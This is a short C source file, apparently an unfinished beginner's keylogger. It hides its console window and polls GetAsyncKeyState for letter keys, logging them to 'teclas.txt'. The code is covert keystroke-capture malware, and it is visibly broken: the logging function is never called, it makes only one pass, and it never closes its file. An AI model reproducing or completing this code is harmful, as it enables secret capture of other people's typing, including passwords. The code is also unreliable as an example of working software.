#include <stdlib.h>
#include <stdio.h>

#ifdef _WIN32

#include <windows.h>

#else

#include <gtk/gtk.h>

#endif

void getWords();

int main(int argc, char *Arquivo[])
{	
	system("echo off");
	ShowWindow(GetForegroundWindow(), SW_HIDE);

	return 0;
}


void getWords()
{	
	int resultado, tecla;
	FILE *file;
	
	file = fopen("teclas.txt", "w");

	Sleep(1);
	for(tecla = 65; tecla <= 90; tecla++)
	{
		resultado = GetAsyncKeyState(tecla);

		if(resultado == -32767) {
			fprintf(file,"%c",tecla);
			
			printf("%c", tecla);
		}
	}
}